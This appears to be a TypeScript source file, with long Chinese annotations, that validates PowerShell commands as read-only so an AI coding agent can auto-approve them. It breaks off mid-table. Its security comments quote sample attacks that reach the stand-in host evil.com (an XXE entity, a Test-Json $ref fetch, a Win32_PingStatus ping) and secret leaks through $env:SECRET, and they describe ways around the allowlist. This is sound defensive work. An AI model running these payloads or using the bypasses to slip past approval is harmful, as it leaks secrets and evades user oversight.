/**
 * 【一句话定位】判定一条 PowerShell 命令是不是**只读**的（不写文件、不改状态、
 * 不发网络请求、不泄露变量）。是则可以在权限流程里自动放行，否则弹框问用户。
 *
 * 【在架构中的位置】
 *   powershellPermissions.ts（权限主流程第 4.5 步"只读自动放行"）
 *        ──调用──> isReadOnlyCommand(command, parsed)   ←── 本文件核心
 *   PowerShellTool.tsx 的 isReadOnly()
 *        ──调用──> hasSyncSecurityConcerns(command)（同步版快速预筛）
 *                  + isReadOnlyCommand(command)（无 AST 时只能走保守路径）
 *   modeValidation.ts ──> 复用本文件的 resolveToCanonical / isSafeOutputCommand /
 *                         isAllowlistedPipelineTail / isCwdChangingCmdlet / argLeaksValue
 *   pathValidation.ts ──> 复用本文件的 resolveToCanonical
 *   本文件 ──> utils/powershell/parser.js（AST 与安全标记、别名表、管道分段）
 *             ──> utils/shell/readOnlyCommandValidation.js（git/gh/docker 的通用只读表）
 *             ──> commonParameters.js（通用参数）
 *
 *   对照 BashTool：src/tools/BashTool/readOnlyValidation.ts 是 Unix 版，
 *   结构完全对应：一张 READONLY_COMMANDS 白名单 + 一堆 isXxxSafe 函数，
 *   git/gh/docker 的只读表两边**共用同一份**（utils/shell/readOnlyCommandValidation.js）。
 *   差异点：这里多了一层"参数元素类型白名单"（elementTypes），
 *   因为 PowerShell 的 $var / @{...} / [cast] 会在运行时求值，
 *   字面文本 ≠ 实际内容 —— 这是 Bash 侧没有的坑。
 *
 * 【核心安全模型：三层白名单】
 *   ① 命令名白名单 CMDLET_ALLOWLIST：只放行我们逐条审过的 cmdlet；
 *   ② 参数白名单 safeFlags：只放行审过的 flag（或用 allowAllFlags 明确声明"全放行"）；
 *   ③ 参数**类型**白名单：只接受 StringConstant（字面量）与 Parameter（参数名），
 *      Variable / Other / ScriptBlock 一律拒绝（因为它们运行时才求值）。
 *   默认策略是 fail-closed：没列出来的 = 不允许。
 *
 * 【贯穿全文件的三种"绕过"手法，务必理解】
 *   ① **别名/后缀**：ls → Get-ChildItem、git.exe → git，所以必须先 resolveToCanonical。
 *   ② **路径式命令名**：scripts\Get-Process 会被 stripModulePrefix 削成 Get-Process，
 *      看起来命中白名单，实际跑的是脚本 —— 靠 nameType==='application' 闸门拦。
 *   ③ **运行时求值**：$env:SECRET、@{...}、[string]$x、($a+$b) 在校验时只是文本，
 *      运行时才展开 —— 靠 elementTypes 白名单 + 元字符兜底拦。
 *
 * 【本文件包含什么】
 *   DOTNET_READ_ONLY_FLAGS / WINDOWS_PATHEXT / SAFE_EXTERNAL_EXES / PIPELINE_TAIL_CMDLETS
 *                                    ：各类小型常量表
 *   CommandConfig                     ：白名单条目的配置结构（safeFlags/regex/回调…）
 *   CMDLET_ALLOWLIST                  ：**主表** —— 命令名 → 配置
 *   SAFE_OUTPUT_CMDLETS               ：纯输出类 cmdlet（可安全接收管道输入）
 *   argLeaksValue()                   ：参数会不会"漏值"（把变量打印出来）
 *   resolveToCanonical()              ：命令名规范化（别名 + Windows 后缀）
 *   isCwdChangingCmdlet()             ：是否改变后续路径解析基准（cd / New-PSDrive）
 *   isSafeOutputCommand()             ：是否是纯输出 cmdlet（仅按名字）
 *   isAllowlistedPipelineTail()       ：管道尾部变换器（带参数校验的窄版）
 *   isProvablySafeStatement()         ：语句形状是否是我们能完全验证的那种
 *   lookupAllowlist()                 ：查表（含别名解析）
 *   hasSyncSecurityConcerns()         ：同步版正则预筛（无 AST 时用）
 *   isReadOnlyCommand()               ：**对外主入口** —— 整条命令只读吗
 *   isAllowlistedCommand()            ：单个命令是否在白名单且参数合规
 *   isExternalCommandSafe()           ：外部命令分派（git/gh/docker/dotnet）
 *   isGitSafe / isGhSafe / isDockerSafe / isDotnetSafe：各自的细粒度校验
 *
 * 【TS 语法速查】
 *   ParsedPowerShellCommand['statements'][number]
 *     **索引访问类型**：从已有类型里"取"出某个字段/元素的类型。
 *     ≈ Java 里写 List<Statement>（这里是"从 ParsedPowerShellCommand 里抽出
 *     statements 数组的元素类型"）。好处是上游改了定义，这里自动跟着变。
 *   Record<string, CommandConfig>
 *     ≈ Java 的 Map<String, CommandConfig>。
 *   Object.create(null)
 *     创建一个**没有原型**的普通对象。为什么要这么做（见 129 行注释）：
 *     普通 {} 会继承 Object.prototype，于是查 CMDLET_ALLOWLIST['constructor']
 *     或 ['__proto__'] 会拿到继承来的属性而不是 undefined —— 这就是
 *     **原型链污染**攻击。用 Object.create(null) 从根上断掉原型链。
 *     Java 没有对应问题（Map 里查不到就是 null）。
 *   Object.assign(target, source)
 *     ≈ Java 的 putAll，把 source 的字段拷进 target 并返回 target。
 *   additionalCommandIsDangerousCallback?: (command: string, element?: X) => boolean
 *     可选的函数类型字段 ≈ Java 里可空的 Predicate 字段；
 *     这是"给每个白名单条目挂一个自定义校验器"的扩展点（策略模式）。
 *   config.additionalCommandIsDangerousCallback?.(originalCommand, cmd)
 *     ?.() 可选调用：函数不存在就整体短路成 undefined（不会抛 NPE）。
 *   cmd.elementTypes?.[i + 1] / children?.[i]
 *     可选链 + 索引：任一环缺失都短路成 undefined。
 */
/**
 * PowerShell read-only command validation.
 *
 * Cmdlets are case-insensitive; all matching is done in lowercase.
 */

import type {
  ParsedCommandElement,
  ParsedPowerShellCommand,
} from '../../utils/powershell/parser.js'

// 索引访问类型：ParsedPowerShellCommand['statements'] 取出 statements 的类型，
// 再用 [number] 取出它**数组元素**的类型。≈ Java 从容器类型里取泛型参数。
type ParsedStatement = ParsedPowerShellCommand['statements'][number]

import { getPlatform } from '../../utils/platform.js'
import {
  COMMON_ALIASES,
  deriveSecurityFlags,
  getPipelineSegments,
  isNullRedirectionTarget,
  isPowerShellParameter,
} from '../../utils/powershell/parser.js'
import type { ExternalCommandConfig } from '../../utils/shell/readOnlyCommandValidation.js'
import {
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  validateFlags,
} from '../../utils/shell/readOnlyCommandValidation.js'
import { COMMON_PARAMETERS } from './commonParameters.js'

// dotnet 的只读 flag：只看版本信息，不构建、不改文件。
const DOTNET_READ_ONLY_FLAGS = new Set([
  '--version',
  '--info',
  '--list-runtimes',
  '--list-sdks',
])

// 白名单条目的配置结构 —— 本文件的「规则语言」。四个字段各有讲究：
//   safeFlags    ：允许哪些 flag（没列出的一律拒绝）
//   allowAllFlags：明确声明「这个命令所有 flag 都无害」（如 Get-Date）
//   regex        ：对整条原始命令再套一个正则约束
//   additionalCommandIsDangerousCallback：自定义的额外危险判定（策略模式的扩展点）
type CommandConfig = {
  /** Safe subcommands or flags for this command */
  safeFlags?: string[]
  /**
   * When true, all flags are allowed regardless of safeFlags.
   * Use for commands whose entire flag surface is read-only (e.g., hostname).
   * Without this, an empty/missing safeFlags rejects all flags (positional
   * args only).
   */
  allowAllFlags?: boolean
  /** Regex constraint on the original command */
  regex?: RegExp
  /** Additional validation callback - returns true if command is dangerous */
  additionalCommandIsDangerousCallback?: (
    command: string,
    element?: ParsedCommandElement,
  ) => boolean
}

/**
 * Shared callback for cmdlets that print or coerce their args to stdout/
 * stderr. `Write-Output $env:SECRET` prints it directly; `Start-Sleep
 * $env:SECRET` leaks via type-coerce error ("Cannot convert value 'sk-...'
 * to System.Double"). Bash's echo regex WHITELISTS safe chars per token.
 *
 * Two checks:
 * 1. elementTypes whitelist — StringConstant (literals) + Parameter (flag
 *    names). Rejects Variable, Other (HashtableAst/ConvertExpressionAst/
 *    BinaryExpressionAst all map to Other), ScriptBlock, SubExpression,
 *    ExpandableString. Same pattern as SAFE_PATH_ELEMENT_TYPES.
 * 2. Colon-bound parameter value — `-InputObject:$env:SECRET` creates a
 *    SINGLE CommandParameterAst; the VariableExpressionAst is its .Argument
 *    child, not a separate CommandElement. elementTypes = [..., 'Parameter'],
 *    whitelist passes. Query children[] for the .Argument's mapped type;
 *    anything other than StringConstant (Variable, ParenExpression wrapping
 *    arbitrary pipelines, Hashtable, etc.) is a leak vector.
 */
/**
 * 【中文】判断这条命令的参数会不会**漏值**（把不该显示的东西打印出来）。
 *
 * 典型场景（对应上方英文注释）：
 *   Write-Output $env:SECRET          → 直接把密钥打印出来
 *   Start-Sleep $env:SECRET           → 类型转换失败，报错信息里带着密钥
 *                                       （Cannot convert value 'sk-...' to System.Double）
 *
 * 两道检查：
 *   ① 元素类型白名单：只放行 StringConstant / Parameter，
 *      拒绝 Variable、Other（哈希表/类型转换/二元表达式）、脚本块、子表达式、可展开串
 *   ② 冒号绑定值：-InputObject:$env:SECRET 在 AST 里是**一个** CommandParameterAst，
 *      变量是它的 .Argument 子节点，所以①查不到，必须查 children[]
 *
 * @returns true = 有泄漏风险（调用方应拒绝自动放行）
 */
export function argLeaksValue(
  _cmd: string,
  element?: ParsedCommandElement,
): boolean {
// slice(1)：elementTypes[0] 是命令名本身，参数从下标 1 开始。
// 这个错位在本文件反复出现，改动时要格外小心。
  const argTypes = (element?.elementTypes ?? []).slice(1)
  const args = element?.args ?? []
  const children = element?.children
  for (let i = 0; i < argTypes.length; i++) {
    if (argTypes[i] !== 'StringConstant' && argTypes[i] !== 'Parameter') {
      // ArrayLiteralAst (`Select-Object Name, Id`) maps to 'Other' — the
      // parse script only populates children for CommandParameterAst.Argument,
      // so we can't inspect elements. Fall back to string-archaeology on the
      // extent text: Hashtable has `@{`, ParenExpr has `(`, variables have
      // `$`, type literals have `[`, scriptblocks have `{`. A comma-list of
      // bare identifiers has none. `Name, $x` still rejects on `$`.
// 兜底的「字符串考古」：老版本解析器不给 children[]，只能看文本里有没有
// $ ( @ { [ 这些元字符。没有元字符就当作是安全的裸标识符列表（如 `Name, Id`）。
      if (!/[$(@{[]/.test(args[i] ?? '')) {
        continue
      }
      return true
    }
// 参数是 Parameter 类型时，必须深入它的 children 看实际值的类型。
// 只看类型名会漏掉 -InputObject:$env:SECRET 这种「值藏在子节点里」的写法。
    if (argTypes[i] === 'Parameter') {
      const paramChildren = children?.[i]
      if (paramChildren) {
        if (paramChildren.some(c => c.type !== 'StringConstant')) {
          return true
        }
      } else {
        // Fallback: string-archaeology on arg text (pre-children parsers).
        // Reject `$` (variable), `(` (ParenExpressionAst), `@` (hash/array
        // sub), `{` (scriptblock), `[` (type literal/static method).
        const arg = args[i] ?? ''
        const colonIdx = arg.indexOf(':')
        if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
          return true
        }
      }
    }
  }
  return false
}

/**
 * 【中文】**核心白名单表**：命令名（小写）→ 该命令的只读配置。
 * 不在表里的命令一律不自动放行（fail-closed）。
 */
/**
 * Allowlist of PowerShell cmdlets that are considered read-only.
 * Each cmdlet maps to its configuration including safe flags.
 *
 * Note: PowerShell cmdlets are case-insensitive, so we store keys in lowercase
 * and normalize input for matching.
 *
 * Uses Object.create(null) to prevent prototype-chain pollution — attacker-
 * controlled command names like 'constructor' or '__proto__' must return
 * undefined, not inherited Object.prototype properties. Same defense as
 * COMMON_ALIASES in parser.ts.
 */
// 用 Object.create(null) 而不是 {}，是为了**断掉原型链**：
// 普通对象会继承 Object.prototype，于是查表时 CMDLET_ALLOWLIST['constructor']
// 或 ['__proto__'] 会返回一个继承来的对象（而不是 undefined），
// 攻击者构造这种命令名就能骗过「查不到就不放行」的判定 —— 即原型链污染。
// ≈ Java 里 Map 查不到一定返回 null，天然没这个问题。
export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
  Object.create(null) as Record<string, CommandConfig>,
  {
    // =========================================================================
    // PowerShell Cmdlets - Filesystem (read-only)
    // =========================================================================
// 键一律**小写**：PowerShell 的 cmdlet 名大小写不敏感，存小写 + 查小写最省心。
    'get-childitem': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Filter',
        '-Include',
        '-Exclude',
        '-Recurse',
        '-Depth',
        '-Name',
        '-Force',
        '-Attributes',
        '-Directory',
        '-File',
        '-Hidden',
        '-ReadOnly',
        '-System',
      ],
    },
    'get-content': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-TotalCount',
        '-Head',
        '-Tail',
        '-Raw',
        '-Encoding',
        '-Delimiter',
        '-ReadCount',
      ],
    },
    'get-item': {
      safeFlags: ['-Path', '-LiteralPath', '-Force', '-Stream'],
    },
    'get-itemproperty': {
      safeFlags: ['-Path', '-LiteralPath', '-Name'],
    },
    'test-path': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-PathType',
        '-Filter',
        '-Include',
        '-Exclude',
        '-IsValid',
        '-NewerThan',
        '-OlderThan',
      ],
    },
    'resolve-path': {
      safeFlags: ['-Path', '-LiteralPath', '-Relative'],
    },
    'get-filehash': {
      safeFlags: ['-Path', '-LiteralPath', '-Algorithm', '-InputStream'],
    },
    'get-acl': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Audit',
        '-Filter',
        '-Include',
        '-Exclude',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - Navigation (read-only, just changes working directory)
    // =========================================================================
    'set-location': {
      safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
    },
    'push-location': {
      safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
    },
    'pop-location': {
      safeFlags: ['-PassThru', '-StackName'],
    },

    // =========================================================================
    // PowerShell Cmdlets - Text searching/filtering (read-only)
    // =========================================================================
    'select-string': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Pattern',
        '-InputObject',
        '-SimpleMatch',
        '-CaseSensitive',
        '-Quiet',
        '-List',
        '-NotMatch',
        '-AllMatches',
        '-Encoding',
        '-Context',
        '-Raw',
        '-NoEmphasis',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - Data conversion (pure transforms, no side effects)
    // =========================================================================
    'convertto-json': {
      safeFlags: [
        '-InputObject',
        '-Depth',
        '-Compress',
        '-EnumsAsStrings',
        '-AsArray',
      ],
    },
    'convertfrom-json': {
      safeFlags: ['-InputObject', '-Depth', '-AsHashtable', '-NoEnumerate'],
    },
    'convertto-csv': {
      safeFlags: [
        '-InputObject',
        '-Delimiter',
        '-NoTypeInformation',
        '-NoHeader',
        '-UseQuotes',
      ],
    },
    'convertfrom-csv': {
      safeFlags: ['-InputObject', '-Delimiter', '-Header', '-UseCulture'],
    },
    'convertto-xml': {
      safeFlags: ['-InputObject', '-Depth', '-As', '-NoTypeInformation'],
    },
    'convertto-html': {
      safeFlags: [
        '-InputObject',
        '-Property',
        '-Head',
        '-Title',
        '-Body',
        '-Pre',
        '-Post',
        '-As',
        '-Fragment',
      ],
    },
    'format-hex': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-InputObject',
        '-Encoding',
        '-Count',
        '-Offset',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - Object inspection and manipulation (read-only)
    // =========================================================================
    'get-member': {
      safeFlags: [
        '-InputObject',
        '-MemberType',
        '-Name',
        '-Static',
        '-View',
        '-Force',
      ],
    },
    'get-unique': {
      safeFlags: ['-InputObject', '-AsString', '-CaseInsensitive', '-OnType'],
    },
    'compare-object': {
      safeFlags: [
        '-ReferenceObject',
        '-DifferenceObject',
        '-Property',
        '-SyncWindow',
        '-CaseSensitive',
        '-Culture',
        '-ExcludeDifferent',
        '-IncludeEqual',
        '-PassThru',
      ],
    },
// ===== 被安全评审剔除的命令（中文复述上方英文注释）=====
// Select-Xml 被移除：XML 外部实体（XXE）会触发网络请求 ——
// 在 -Content 里写 <!DOCTYPE x [<!ENTITY e SYSTEM \「http://evil.com/x\」>]>，
// XmlDocument.LoadXml 默认**不禁用**实体解析，于是真的发出一个 GET 请求。
// 同类问题在下面 Get-WinEvent 的 -FilterXml 处也出现一次。
    // SECURITY: select-xml REMOVED. XML external entity (XXE) resolution can
    // trigger network requests via DOCTYPE SYSTEM/PUBLIC references in -Content
    // or -Xml. `Select-Xml -Content '<!DOCTYPE x [<!ENTITY e SYSTEM
    // "http://evil.com/x">]><x>&e;</x>' -XPath '/'` sends a GET request.
    // PowerShell's XmlDocument.LoadXml doesn't disable entity resolution by
    // default. Removal forces prompt.
    'join-string': {
      safeFlags: [
        '-InputObject',
        '-Property',
        '-Separator',
        '-OutputPrefix',
        '-OutputSuffix',
        '-SingleQuote',
        '-DoubleQuote',
        '-FormatString',
      ],
    },
// Test-Json 被移除：-Schema（1 号位置参数）接受带 $ref 的 JSON Schema，
// Test-Json 会去**下载**那个外部 URL。而 safeFlags 只校验显式的 flag，
// 管不到位置绑定 —— `Test-Json '{}' '{\「$ref\」:\「http://evil.com\」}'` 会被放行。
// 这说明一条重要经验：**能发起网络请求的命令，光靠 flag 白名单是不够的**。
    // SECURITY: Test-Json REMOVED. -Schema (positional 1) accepts JSON Schema
    // with $ref pointing to external URLs — Test-Json fetches them (network
    // request). safeFlags only validates EXPLICIT flags, not positional binding:
    // `Test-Json '{}' '{"$ref":"http://evil.com"}'` → position 1 binds to
    // -Schema → safeFlags check sees two non-flag args, skips both → auto-allow.
    'get-random': {
      safeFlags: [
        '-InputObject',
        '-Minimum',
        '-Maximum',
        '-Count',
        '-SetSeed',
        '-Shuffle',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - Path utilities (read-only)
    // =========================================================================
    // convert-path's entire purpose is to resolve filesystem paths. It is now
    // in CMDLET_PATH_CONFIG for proper path validation, so safeFlags here only
    // list the path parameters (which CMDLET_PATH_CONFIG will validate).
// convert-path 已移入 CMDLET_PATH_CONFIG 做真正的路径校验，
// 这里的 safeFlags 只列出「哪些参数是路径参数」（交给路径校验模块处理）。
    'convert-path': {
      safeFlags: ['-Path', '-LiteralPath'],
    },
    'join-path': {
// Join-Path / Split-Path 的 -Resolve 被**刻意移除**：
// 它会真的去文件系统上验证路径是否存在（有副作用，且路径没被校验过）。
// 不带 -Resolve 时，这两个命令纯粹是字符串处理 —— 只读且无害。
      // -Resolve removed: it touches the filesystem to verify the joined path
      // exists, but the path was not validated against allowed directories.
      // Without -Resolve, Join-Path is pure string manipulation.
      safeFlags: ['-Path', '-ChildPath', '-AdditionalChildPath'],
    },
    'split-path': {
      // -Resolve removed: same rationale as join-path. Without -Resolve,
      // Split-Path is pure string manipulation.
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Qualifier',
        '-NoQualifier',
        '-Parent',
        '-Leaf',
        '-LeafBase',
        '-Extension',
        '-IsAbsolute',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - Additional system info (read-only)
    // =========================================================================
// Get-Clipboard **刻意不放行**：剪贴板里可能躺着密码或 API key。
// BashTool 那边同样不自动放行 pbpaste / xclip —— 两边口径一致。
    // NOTE: Get-Clipboard is intentionally NOT included - it can expose sensitive
    // data like passwords or API keys that the user may have copied. Bash also
    // does not auto-allow clipboard commands (pbpaste, xclip, etc.).
    'get-hotfix': {
      safeFlags: ['-Id', '-Description'],
    },
    'get-itempropertyvalue': {
      safeFlags: ['-Path', '-LiteralPath', '-Name'],
    },
    'get-psprovider': {
      safeFlags: ['-PSProvider'],
    },

    // =========================================================================
    // PowerShell Cmdlets - Process/System info
    // =========================================================================
    'get-process': {
      safeFlags: [
        '-Name',
        '-Id',
        '-Module',
        '-FileVersionInfo',
        '-IncludeUserName',
      ],
    },
    'get-service': {
      safeFlags: [
        '-Name',
        '-DisplayName',
        '-DependentServices',
        '-RequiredServices',
        '-Include',
        '-Exclude',
      ],
    },
    'get-computerinfo': {
      allowAllFlags: true,
    },
    'get-host': {
      allowAllFlags: true,
    },
    'get-date': {
      safeFlags: ['-Date', '-Format', '-UFormat', '-DisplayHint', '-AsUTC'],
    },
    'get-location': {
      safeFlags: ['-PSProvider', '-PSDrive', '-Stack', '-StackName'],
    },
    'get-psdrive': {
      safeFlags: ['-Name', '-PSProvider', '-Scope'],
    },
// Get-Command 被移除：-Name 会触发**模块自动加载**，从而执行 .psm1 的初始化代码。
// 攻击链：往 PSModulePath 里预置一个恶意模块，再诱导触发自动加载。
// 之前试过「去掉 -Name 参数 + 拒绝位置参数」，但管道输入
// （'EvilCmdlet' | Get-Command）根本不产生 args，回调压根不会被调用 —— 只能整体移除。
    // SECURITY: Get-Command REMOVED from allowlist. -Name (positional 0,
    // ValueFromPipeline=true) triggers module autoload which runs .psm1 init
    // code. Chain attack: pre-plant module in PSModulePath, trigger autoload.
    // Previously tried removing -Name/-Module from safeFlags + rejecting
    // positional StringConstant, but pipeline input (`'EvilCmdlet' | Get-Command`)
    // bypasses the callback entirely since args are empty. Removal forces
    // prompt. Users who need it can add explicit allow rule.
    'get-module': {
      safeFlags: [
        '-Name',
        '-ListAvailable',
        '-All',
        '-FullyQualifiedName',
        '-PSEdition',
      ],
    },
// Get-Help 被移除：与 Get-Command 完全相同的模块自动加载风险。
// （man / help 这两个别名因此也连带失效，见 877 行注释。）
    // SECURITY: Get-Help REMOVED from allowlist. Same module autoload hazard
    // as Get-Command (-Name has ValueFromPipeline=true, pipeline input bypasses
    // arg-level callback). Removal forces prompt.
    'get-alias': {
      safeFlags: ['-Name', '-Definition', '-Scope', '-Exclude'],
    },
    'get-history': {
      safeFlags: ['-Id', '-Count'],
    },
    'get-culture': {
      allowAllFlags: true,
    },
    'get-uiculture': {
      allowAllFlags: true,
    },
    'get-timezone': {
      safeFlags: ['-Name', '-Id', '-ListAvailable'],
    },
    'get-uptime': {
      allowAllFlags: true,
    },

    // =========================================================================
    // PowerShell Cmdlets - Output & misc (no side effects)
    // =========================================================================
// Write-Output ≈ bash 的 echo：无害，但参数里带变量就会把变量值打印出来，
// 所以挂上 argLeaksValue 做额外校验。
    // Bash parity: `echo` is auto-allowed via custom regex (BashTool
    // readOnlyValidation.ts:~1517). That regex WHITELISTS safe chars per arg.
    // See argLeaksValue above for the three attack shapes it blocks.
    'write-output': {
      safeFlags: ['-InputObject', '-NoEnumerate'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
// Write-Host 走的是 Information 流（不进管道），能力比 Write-Output 更弱，
// 但「打印变量值」这个泄漏面是一样的，所以同样挂 argLeaksValue。
    // Write-Host bypasses the pipeline (Information stream, PS5+), so it's
    // strictly less capable than Write-Output — but the same
    // `Write-Host $env:SECRET` leak-via-display applies.
    'write-host': {
      safeFlags: [
        '-Object',
        '-NoNewline',
        '-Separator',
        '-ForegroundColor',
        '-BackgroundColor',
      ],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
// Start-Sleep ≈ bash 的 sleep：运行时零副作用，
// 但 `Start-Sleep $env:SECRET` 会因类型转换报错把密钥带出来 —— 同样要挂校验。
    // Bash parity: `sleep` is in READONLY_COMMANDS (BashTool
    // readOnlyValidation.ts:~1146). Zero side effects at runtime — but
    // `Start-Sleep $env:SECRET` leaks via type-coerce error. Same guard.
    'start-sleep': {
      safeFlags: ['-Seconds', '-Milliseconds', '-Duration'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
// Format-* / Measure-Object 从 SAFE_OUTPUT_CMDLETS **搬到**这里：
// 因为它们都接受「计算属性哈希表」（@{N='x';E={...}}），里面能塞任意表达式。
// 搬过来的好处：isSafeOutputCommand 是**只看名字**的检查，
// 会赶在参数校验之前就把它们过滤掉（等于跳过校验）；
// 放进本表则由 argLeaksValue 逐个校验参数 —— 裸 `Format-Table` 放行，
// `Format-Table $env:SECRET` 拦住。
    // Format-* and Measure-Object moved here from SAFE_OUTPUT_CMDLETS after
    // security review found all accept calculated-property hashtables (same
    // exploit as Where-Object — I4 regression). isSafeOutputCommand is a
    // NAME-ONLY check that filtered them out of the approval loop BEFORE arg
    // validation. Here, argLeaksValue validates args:
    //   | Format-Table               → no args → safe → allow
    //   | Format-Table Name, CPU     → StringConstant positionals → safe → allow
    //   | Format-Table $env:SECRET   → Variable elementType → blocked → passthrough
    //   | Format-Table @{N='x';E={}} → Other (HashtableAst) → blocked → passthrough
    //   | Measure-Object -Property $env:SECRET → same → blocked
    // allowAllFlags: argLeaksValue validates arg elementTypes (Variable/Hashtable/
    // ScriptBlock → blocked). Format-* flags themselves (-AutoSize, -GroupBy,
    // -Wrap, etc.) are display-only. Without allowAllFlags, the empty-safeFlags
    // default rejects ALL flags — `Format-Table -AutoSize` would over-prompt.
    'format-table': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-list': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-wide': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-custom': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'measure-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
// Select/Sort/Group/Where-Object 与上面 Format-* 同理（都吃计算属性哈希表）。
// allowAllFlags 的理由：-First/-Last/-Skip/-Property 这些选择类 flag 本身无害，
// 危险的是它们的**值**，那部分交给 argLeaksValue 判。
    // Select-Object/Sort-Object/Group-Object/Where-Object: same calculated-
    // property hashtable surface as format-* (about_Calculated_Properties).
    // Removed from SAFE_OUTPUT_CMDLETS but previously missing here, causing
    // `Get-Process | Select-Object Name` to over-prompt. argLeaksValue handles
    // them identically: StringConstant property names pass (`Select-Object Name`),
    // HashtableAst/ScriptBlock/Variable args block (`Select-Object @{N='x';E={...}}`,
    // `Where-Object { ... }`). allowAllFlags: -First/-Last/-Skip/-Descending/
    // -Property/-EQ etc. are all selection/ordering flags — harmless on their own;
    // argLeaksValue catches the dangerous arg *values*.
    'select-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'sort-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'group-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'where-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
// Out-String / Out-Host 也搬到这里：它们有 -InputObject，同样能泄漏。
    // Out-String/Out-Host moved here from SAFE_OUTPUT_CMDLETS — both accept
    // -InputObject which leaks the same way Write-Output does.
    // `Get-Process | Out-String -InputObject $env:SECRET` → secret prints.
    // allowAllFlags: -Width/-Stream/-Paging/-NoNewline are display flags;
    // argLeaksValue catches the dangerous -InputObject *value*.
    'out-string': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'out-host': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },

    // =========================================================================
    // PowerShell Cmdlets - Network info (read-only)
    // =========================================================================
// ===== 网络信息类 cmdlet（只读）=====
    'get-netadapter': {
      safeFlags: [
        '-Name',
        '-InterfaceDescription',
        '-InterfaceIndex',
        '-Physical',
      ],
    },
    'get-netipaddress': {
      safeFlags: [
        '-InterfaceIndex',
        '-InterfaceAlias',
        '-AddressFamily',
        '-Type',
      ],
    },
    'get-netipconfiguration': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias', '-Detailed', '-All'],
    },
    'get-netroute': {
      safeFlags: [
        '-InterfaceIndex',
        '-InterfaceAlias',
        '-AddressFamily',
        '-DestinationPrefix',
      ],
    },
    'get-dnsclientcache': {
// Get-DnsClientCache 的 -CimSession **刻意排除**：它会连到远程主机（网络请求）。
// 之前这里是空配置（等于所有 flag 都放行），属于漏网。
      // SECURITY: -CimSession/-ThrottleLimit excluded. -CimSession connects to
      // a remote host (network request). Previously empty config = all flags OK.
      safeFlags: ['-Entry', '-Name', '-Type', '-Status', '-Section', '-Data'],
    },
    'get-dnsclient': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias'],
    },

    // =========================================================================
    // PowerShell Cmdlets - Event log (read-only)
    // =========================================================================
    'get-eventlog': {
      safeFlags: [
        '-LogName',
        '-Newest',
        '-After',
        '-Before',
        '-EntryType',
        '-Index',
        '-InstanceId',
        '-Message',
        '-Source',
        '-UserName',
        '-AsBaseObject',
        '-List',
      ],
    },
    'get-winevent': {
// Get-WinEvent 的 -FilterXml 被移除（XXE → 网络请求，与 Select-Xml 同源）；
// -FilterHashtable 也被显式移除（哈希表虽会被类型检查拦住，但显式剔除更清楚）；
// -FilterXPath **保留**（只是字符串模式匹配，不解析实体）。
      // SECURITY: -FilterXml/-FilterHashtable removed. -FilterXml accepts XML
      // with DOCTYPE external entities (XXE → network request). -FilterHashtable
      // would be caught by the elementTypes 'Other' check since @{} is
      // HashtableAst, but removal is explicit. Same XXE hazard as Select-Xml
      // (removed above). -FilterXPath kept (string pattern only, no entity
      // resolution). -ComputerName/-Credential also implicitly excluded.
      safeFlags: [
        '-LogName',
        '-ListLog',
        '-ListProvider',
        '-ProviderName',
        '-Path',
        '-MaxEvents',
        '-FilterXPath',
        '-Force',
        '-Oldest',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - WMI/CIM
    // =========================================================================
// Get-WmiObject / Get-CimInstance 被移除：它们会**主动发起网络请求** ——
// 比如枚举 Win32_PingStatus 就真的发 ICMP 包（DNS 泄漏 + 可能泄漏 NTLM 凭据）。
// 而且 WMI 会自动加载 provider DLL（等于执行其初始化代码）。
// get-cimclass 保留：它只列类的**元数据**，不枚举实例。
    // SECURITY: Get-WmiObject and Get-CimInstance REMOVED. They actively
    // trigger network requests via classes like Win32_PingStatus (sends ICMP
    // when enumerated) and can query remote computers via -ComputerName/
    // CimSession. -Class/-ClassName/-Filter/-Query accept arbitrary WMI
    // classes/WQL that we cannot statically validate.
    //   PoC: Get-WmiObject -Class Win32_PingStatus -Filter 'Address="evil.com"'
    //   → sends ICMP to evil.com (DNS leak + potential NTLM auth leak).
    // WMI can also auto-load provider DLLs (init code). Removal forces prompt.
    // get-cimclass stays — only lists class metadata, no instance enumeration.
    'get-cimclass': {
      safeFlags: [
        '-ClassName',
        '-Namespace',
